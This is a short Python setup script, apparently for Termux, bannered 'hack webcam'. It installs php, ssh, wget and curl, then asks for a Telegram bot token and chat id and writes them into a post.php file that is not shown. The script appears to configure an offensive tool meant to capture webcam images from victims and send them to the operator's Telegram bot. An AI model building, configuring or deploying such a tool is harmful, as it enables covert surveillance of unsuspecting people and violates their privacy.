import os
os.system("apt update")
os.system("pkg install python")
os.system("pkg install python3")
os.system("pip install pyfiglet")
os.system("pkg install ssh")
os.system("pkg install php")
os.system("pkg install wget")
os.system("pkg install curl")

tb = open("setp.py").read()
tb = tb.replace("#" ,"#")
hj = open("setp.py","w")
hj.write(tb)
hj.close()
import pyfiglet
class color :
    GREEN = '\033[92m'
    RED = '\033[91m'
    WHITE = '\033[0m'

hd  = pyfiglet.figlet_format("hack webcam")
print (color.RED+hd)
print (color.WHITE+" * "+color.RED+"coded by https://github.com/abol-hack")
print("")
token = input(color.GREEN + "your bot token : "+color.RED)
a = open("post.php").read()
a = a.replace("abolhacktoken" ,token)
b = open("post.php","w")
b.write(a)
b.close()
id= input(color.GREEN + "your chat id : "+color.RED)
f = open("post.php").read()
f = f.replace("abolhackid",id)
c = open("post.php","w")
c.write(f)
c.close()
